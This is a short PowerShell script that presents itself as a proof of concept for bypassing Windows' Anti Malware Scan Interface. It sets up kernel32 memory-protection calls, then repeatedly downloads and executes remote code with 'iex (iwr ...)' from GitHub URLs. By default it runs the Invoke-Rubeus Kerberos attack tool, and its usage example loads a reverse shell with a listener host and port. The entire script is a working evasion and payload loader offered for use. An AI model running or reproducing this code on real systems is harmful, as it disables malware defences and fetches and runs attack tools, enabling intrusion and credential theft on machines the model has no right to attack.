<#
.SYNOPSIS  
    This script is a proof of concept to bypass Anti Malware Scan Interface By splitting a files into smaller ones
    
.NOTES  
    Function   : AMSI_Bypass
    File Name  : AMSI.ps1
.EXAMPLE  
     import-module AMSI.ps1
     AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
     AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
#>
 $Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

    Add-Type $Win32
    
function AMSI_Lines() { 
    Param (
           
        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1",
        [String]$Commands = 'invoke-rubeus -command "-h"'
    )
       
   

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

sleep 2
iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing)

sleep 2
iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing )

sleep 2
iex ( iwr $File -UseBasicParsing) ; iex $Commands
};

AMSI_Lines
